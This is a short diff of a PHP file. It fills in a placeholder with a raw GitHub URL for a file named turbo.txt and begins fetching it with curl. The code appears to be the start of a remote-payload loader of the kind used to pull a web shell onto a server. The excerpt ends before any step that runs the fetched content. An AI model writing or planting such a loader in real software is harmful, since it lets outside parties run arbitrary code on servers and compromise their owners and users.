@@ -1,5 +1,5 @@
 <?php
-$url = 'LINK TXT RAW-GITHUB';
+$url = 'https://raw.githubusercontent.com/palakaubotak/keparatkau/refs/heads/main/turbo.txt';
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
